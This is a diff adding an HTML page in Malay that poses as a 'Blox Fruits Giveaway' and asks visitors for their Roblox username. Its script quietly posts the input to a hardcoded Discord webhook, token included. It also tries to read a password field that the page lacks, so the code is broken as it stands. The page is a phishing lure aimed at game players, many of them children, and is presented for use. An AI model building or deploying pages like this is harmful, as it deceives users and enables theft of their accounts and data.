@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Blox Fruit Giveaway</title>
+  <style>
+    body {
+      background-color: #1a1a1a;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    input, button {
+      font-size: 18px;
+      padding: 10px;
+      margin: 10px;
+    }
+    button {
+      background-color: #7289da;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>Blox Fruits Giveaway</h1>
+  <p>Masukkan username Roblox anda:</p>
+  <input type="text" id="username" placeholder="Contoh: ZoroOnePiece">
+  <br>
+  <button onclick="submitData()">Join Giveaway</button>
+
+  <script>
+    function submitData() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const webhookURL = "https://discord.com/api/webhooks/1396797120983466044/6YdZO0lCdFr9DOXIBS3iEv1G2Xw9FLyj20nEwx4nfOP172TVk-DgYTPEKIWf8RrYtbzG";
+
+      if (!username) {
+        alert("Sila isi username dulu.");
+        return;
+      }
+
+      const content = {
+        content: `🎁 Pengguna baru join giveaway!\nUsername: **${username}**`
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(content)
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("Berjaya join giveaway!");
+        } else {
+          alert("Gagal hantar ke Discord. Sila cuba lagi.");
+        }
+      });
+    }
+  </script>
+</body>
+</html>
